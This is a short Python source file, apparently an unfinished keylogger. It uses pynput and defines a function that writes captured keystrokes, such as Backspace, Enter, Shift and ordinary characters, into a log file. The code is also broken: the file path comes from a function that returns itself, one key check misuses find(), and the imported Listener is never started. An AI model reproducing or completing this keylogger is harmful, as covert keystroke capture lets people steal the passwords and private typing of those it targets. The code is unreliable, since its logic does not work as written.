from pynput.keyboard import Listener

def file():
    return file

def write_file(key):
    path = str(file())
    with open(path, 'a') as f:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')
            elif k.find('ctrl') > 0:
                f.write(' Ctrl ')
            elif k.find('Key'):
                f.write(k)